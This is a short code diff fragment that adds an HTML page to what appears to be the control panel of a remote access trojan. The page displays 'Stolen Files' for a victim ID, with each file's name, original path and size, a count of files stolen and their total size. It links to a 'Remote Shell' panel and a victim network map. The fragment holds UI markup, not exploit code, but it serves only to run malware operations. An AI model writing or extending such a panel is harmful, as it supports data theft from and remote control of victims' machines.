+            tr:hover {{ background: #1c2128; }}
+        </style>
+    </head>
+    <body>
+        <div class="topbar">
+            <h1>📁 Stolen Files — {vid[:12]}...</h1>
+            <div><a href="/">← Dashboard</a><a href="/rat_panel/{vid}">🎮 Remote Shell</a><a href="/network_map/{vid}">🗺️ Network</a></div>
+        </div>
+        <div class="content">
+            <div class="stat">
+                <div><div class="num">{len(files)}</div><div class="lbl">Files Stolen</div></div>
+                <div><div class="num">{sum(f.get('size', 0) for f in files) / 1024:.1f} KB</div><div class="lbl">Total Size</div></div>
+            </div>
+            <table>
+                <thead><tr><th>File Name</th><th>Original Path</th><th>Size</th><th>Action</th></tr></thead>
+                <tbody>{file_rows}</tbody>
+            </table>
+        </div>
+    </body>
+    </html>
+    """
+    return html
 
 if __name__ == '__main__':
     print("\n" + "="*50)
